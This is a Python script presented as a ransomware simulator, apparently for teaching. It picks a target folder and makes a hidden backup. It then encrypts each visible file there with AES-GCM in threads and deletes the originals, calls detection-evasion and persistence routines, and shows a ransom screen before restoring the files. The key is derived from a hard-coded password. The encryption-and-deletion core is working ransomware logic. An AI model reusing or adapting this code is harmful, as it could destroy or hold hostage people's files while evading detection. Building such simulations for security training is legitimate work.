import threading
import time
import random
import shutil
from pathlib import Path

import evasion
import crypto_manager
import file_system
import ui_manager

# CONFIGURATION
TEACHER_PASSWORD = "bob"

class RansomwareSimulator:
    def __init__(self):
        self.target_dir = None
        self.backup_dir = None
        self.backup_mapping = {}
        self.encrypted_files = []
        self.key = None

    def process_encryption(self, file_path, key):
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Utilisation du nouveau moteur AES-GCM
            encrypted = crypto_manager.encrypt_data(content, key)
            
            new_name = file_path.with_suffix(file_path.suffix + '.encrypted')
            with open(new_name, 'wb') as f:
                f.write(encrypted)
            
            time.sleep(random.uniform(0.1, 0.3))
            file_path.unlink()
            self.encrypted_files.append(str(new_name))
        except Exception as e:
            print(f"❌ Erreur: {e}")

    def run(self):
        # 1. Vérification des privilèges (Dès le départ)
        if not evasion.is_admin():
            print("⚠️  Attention : Le script n'est pas lancé en Administrateur/Root.")
            print("Certaines fonctionnalités de simulation (persistance/système) seront limitées.")
        else:
            print("✅ Droits Administrateur détectés. Simulation complète activée.")

        # 2. Sélection de la cible
        self.target_dir = file_system.get_target_directory()
        
        # 3. Lancement furtif (L'utilisateur ne voit rien)
        evasion.evade_detection()
        self.backup_dir, self.backup_mapping = file_system.create_stealth_backup(self.target_dir)
        
        # On utilise le mot de passe "bob" automatiquement
        self.key = crypto_manager.derive_key(TEACHER_PASSWORD)
        
        # 4. Chiffrement multi-threadé en arrière-plan
        threads = []
        for file_path in self.target_dir.glob("*"):
            if file_path.is_file() and not file_path.name.startswith('.'):
                t = threading.Thread(target=self.process_encryption, args=(file_path, self.key))
                t.start()
                threads.append(t)
        
        for t in threads: t.join()
        
        # 5. L'Effet de Surprise
        p_path = evasion.simulate_persistence()
        evasion.clear_screen()
        ui_manager.launch_ransom_gui() # <--- BOOM : L'écran apparaît ici
        
        # 6. Restauration automatique après fermeture GUI
        print("\n🔒 Fenêtre fermée. Restauration des fichiers...")
        file_system.restore_files(self.backup_mapping)
        
        if self.backup_dir: 
            shutil.rmtree(self.backup_dir)
            
        print(f"\n✅ Simulation terminée. Persistance simulée à : {p_path}")

if __name__ == "__main__":
    sim = RansomwareSimulator()
    sim.run()
